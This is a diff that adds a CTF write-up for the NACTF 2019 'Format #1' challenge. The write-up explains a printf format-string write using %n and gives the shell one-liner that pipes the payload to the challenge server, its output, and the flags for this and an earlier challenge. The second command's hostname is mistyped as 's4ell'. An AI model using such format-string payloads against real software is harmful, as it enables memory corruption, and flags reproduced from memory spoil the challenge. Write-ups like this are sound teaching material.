@@ -473,3 +473,37 @@ Type something>You typed: nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}
 
 #### Flag
 `nactf{Pr1ntF_L34k_m3m0ry_r34d_nM05f469}`
+
+
+***
+
+## Format #1 (250)
+
+#### Description
+> printf can do more than just read memory... can you change the variable?
+
+> Connect at nc shell.2019.nactf.com 31560
+
+#### Hint
+> Check a list of printf conversion specifiers
+
+#### File
+- [format-1](Files/format-1)
+- [format-1.c](Files/format-1.c)
+
+#### Solution
+This time, we need to overwrite **num** into **42**. We do it by using "%n".
+
+We just need to know the offset of **num** from **buf**. Alse, we can brute force it:
+```bash
+$ python -c "print 'A'*42 + '%23\$n'" | nc shell.2019.nactf.com 31560
+Type something>You typed: 
+
+$ python -c "print 'A'*42 + '%24\$n'" | nc s4ell.2019.nactf.com 31560
+Type something>You typed: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+You win!
+nactf{Pr1ntF_wr1t3s_t0o_rZFCUmba}
+```
+
+#### Flag
+`nactf{Pr1ntF_wr1t3s_t0o_rZFCUmba}`
